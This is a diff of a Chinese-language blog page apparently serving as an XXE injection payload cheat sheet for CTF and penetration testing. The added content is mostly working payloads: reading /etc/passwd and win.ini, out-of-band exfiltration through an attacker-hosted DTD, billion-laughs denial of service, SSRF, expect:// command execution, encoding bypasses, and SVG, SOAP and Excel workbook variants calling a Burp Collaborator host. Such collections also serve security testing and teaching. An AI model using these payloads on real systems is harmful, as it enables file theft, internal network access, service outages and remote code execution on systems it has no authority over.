@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2019021812272363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190218122739222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-08-05T03:29:29.000Z">
-<meta property="article:modified_time" content="2022-07-15T08:39:47.684Z">
+<meta property="article:modified_time" content="2022-11-25T04:27:07.343Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="XXE">
@@ -297,7 +297,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.7k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -442,20 +442,20 @@ height:50vh;
 
 </li>
 </ol>
-<h1 id="XEE注入"><a href="#XEE注入" class="headerlink" title="XEE注入"></a>XEE注入</h1><p><strong>注意：有时候并不是只有上传xml的时候才有xxe，也可以试试将json改为xxe</strong></p>
+<h1 id="XEE注入"><a href="#XEE注入" class="headerlink" title="XEE注入"></a>XEE注入</h1><h2 id="常规payload"><a href="#常规payload" class="headerlink" title="常规payload"></a>常规payload</h2><p><strong>注意：有时候并不是只有上传xml的时候才有xxe，也可以试试将json改为xxe</strong></p>
 <ol>
 <li><p>读入系统文件</p>
 <p>方法一(有回显)：</p>
 </li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-<p>方法二(vps读取dtd)：</p>
+<p>​    方法二(vps读取dtd)：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % a SYSTEM <span class="string">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">%a;</span><br><span class="line">&lt;note&gt;&amp;xee;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
 
 <p>其中evil.dtd的格式为：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTINY xee SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<p>方法三（读取文件内容发送到vps)：</p>
+<p>​    方法三（读取文件内容发送到vps)：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xee</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:9999/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xee;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>xxe.dtd文件内容为</p>
@@ -467,19 +467,50 @@ height:50vh;
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (<span class="comment">#ANY)&gt;</span></span><br><span class="line">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span><br><span class="line">&lt;!ENTITY a1 <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY a2 <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
 
-<ol start="3">
-<li>SSRF<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM <span class="string">&quot;http://publicServer.com/&quot;</span> [</span><br><span class="line">&lt;!ELEMENT data (<span class="comment">#ANY)&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">lolz</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">lol1</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol2 &quot;</span>&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol3 &quot;</span>&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol4 &quot;</span>&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol5 &quot;</span>&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol6 &quot;</span>&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol7 &quot;</span>&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol8 &quot;</span>&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol9 &quot;</span>&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;tag&gt;&amp;lol9;&lt;/tag&gt;</span></span></span></span><br></pre></td></tr></table></figure>
 
-</li>
+<ol start="3">
+<li>SSRF</li>
 </ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM <span class="string">&quot;http://publicServer.com/&quot;</span> [</span><br><span class="line">&lt;!ELEMENT data (<span class="comment">#ANY)&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
 <p>4.RCE</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;expect://id&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=<span class="string">&quot;test101&quot;</span>&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>
 
 <ol start="5">
-<li>XInclude<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span>?&gt;</span><br><span class="line">&lt;data xmlns:xi=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;&lt;xi:include href=<span class="string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;&lt;/xi:include&gt;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<li><p>XInclude</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span>?&gt;</span><br><span class="line">&lt;data xmlns:xi=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;&lt;xi:include href=<span class="string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;&lt;/xi:include&gt;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>本地文件包含</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> (<span class="meta-keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY blind SYSTEM &quot;https:&#x2F;&#x2F;www.example.com&#x2F;?%xxe;&quot;&gt;]&gt;&lt;foo&gt;&amp;blind;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程加载</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://example.com/entity1.xml&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span><span class="tag">&lt;<span class="name">lol</span>&gt;</span>3..2..1...&amp;test<span class="tag">&lt;<span class="name">lol</span>&gt;</span><span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>UTF-7</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span></span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Base64</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">init</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;</span>&gt;</span> %init; ]&gt;</span><span class="tag">&lt;<span class="name">foo</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SOAP</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SVG</p>
+<p>文件读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xyz</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/Windows/win.ini&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
 
 </li>
 </ol>
+<pre><code>RCE
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;expect://calc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></code></pre>
 <h2 id="excel的XXE利用"><a href="#excel的XXE利用" class="headerlink" title="excel的XXE利用"></a>excel的XXE利用</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>外部实体攻击非常常见，特别是通过基于HTTP的API，我们经常遇到并利用以此通常获得对客户端环境的特权访问。<br>不常见的是用Excel进行XXE攻击。</p>
 <h3 id="这是什么方式"><a href="#这是什么方式" class="headerlink" title="这是什么方式"></a>这是什么方式</h3><p>实际上，与所有post-Office 2007文件格式一样，现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。<br>许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。<br>在这篇文章中，我专注于Excel只是因为处理Excel文件比使用Word文档或Powerpoint更常见，但它肯定并不罕见，本文中的任何内容都可能适用于这些应用程序。</p>
 <h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>假设我们有一个接受Excel文件进行上传和处理的目标应用程序，我们就可以开始探测XXE了。相同的攻击有效负载可能会起作用，我们只需将它们放入Excel文件即可。<br>创建一个新的空白Excel文件。你可以在某些单元格中键入内容，但实际上并不是必需的。如果您没有安装Excel？您可以使用Google表格，然后下载为xlsx。<br>创建一个目录以将Excel文件解压缩并解压缩。</p>
@@ -491,7 +522,7 @@ height:50vh;
 <p>打开Burp Suite Professional，单击Burp菜单并选择“Burp Collaborator client”将其打开。</p>
 <p><img src="https://img-blog.csdnimg.cn/20190218122601198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>单击“复制到剪贴板”。就我而言，值是gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net。现在我们将其插入到XML中。<br>打开xl/workbook.xml并将以下内容插入第2行和第3行。确保从Burp中粘贴你的值，而不是下面显示的值。:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>你的xl/workbook.xml现在会是像这样。</p>
 <p><img src="https://img-blog.csdnimg.cn/20190218122639287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
@@ -538,7 +569,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">August 5th 2020, 11:29:29 am</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">July 15th 2022, 4:39:47 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">November 25th 2022, 12:27:07 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -683,7 +714,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%92%8CDTD%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">XML和DTD格式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XEE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">XEE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#excel%E7%9A%84XXE%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">excel的XXE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">这是什么方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E9%97%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8BURP-COLLABORATOR%E5%AF%B9XXE%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B5%8B"><span class="toc-number">2.1.4.</span> <span class="toc-text">使用BURP COLLABORATOR对XXE进行盲测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">XXE绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">XXE注入防御</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%92%8CDTD%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">XML和DTD格式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XEE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">XEE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84payload"><span class="toc-number">2.1.</span> <span class="toc-text">常规payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#excel%E7%9A%84XXE%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">excel的XXE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.2.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">这是什么方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E9%97%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8BURP-COLLABORATOR%E5%AF%B9XXE%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B5%8B"><span class="toc-number">2.2.4.</span> <span class="toc-text">使用BURP COLLABORATOR对XXE进行盲测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">XXE绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">XXE注入防御</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3339,9 +3370,161 @@ top:50vh;
     
     
     
+    
